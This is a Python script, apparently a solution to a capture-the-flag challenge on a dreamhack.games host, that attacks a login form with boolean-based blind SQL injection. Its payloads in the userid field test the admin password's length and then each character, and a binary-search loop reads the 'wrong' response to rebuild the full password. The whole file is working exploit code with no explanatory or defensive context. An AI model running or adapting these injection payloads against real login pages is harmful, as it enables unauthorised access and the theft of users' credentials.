import requests

url = "http://host3.dreamhack.games:8806/login"

left,right=0,100
while True:
    mid=(left+right)//2
    print(mid,left,right)
    if left+1>=right:break
    
    data = {"userid":'" or ((SELECT LENGTH(userpassword) WHERE userid="admin")<%d)--'%mid, "userpassword":"asd"}
    resp = requests.post(url, data=data)
    if "wrong" in resp.text:
        left=mid
    else:
        right=mid
passwordLen = mid
print(mid)

password = ""

for i in range(1,passwordLen+1):
    left, right=0x20, 0x7E
    while True:
        mid = (left+right)//2
        #print(mid,left,right)
        if left+1>=right:break

        data = {"userid":'" or ((SELECT substr(userpassword,%d,1) WHERE userid="admin") < CHAR(%s))--'%(i,mid), "userpassword":"asd"}
        resp = requests.post(url, data=data)
        if "wrong" in resp.text:
            left=mid
        else:
            right=mid
    print(f"{i}th is {mid}")
    password += chr(mid)
print(password)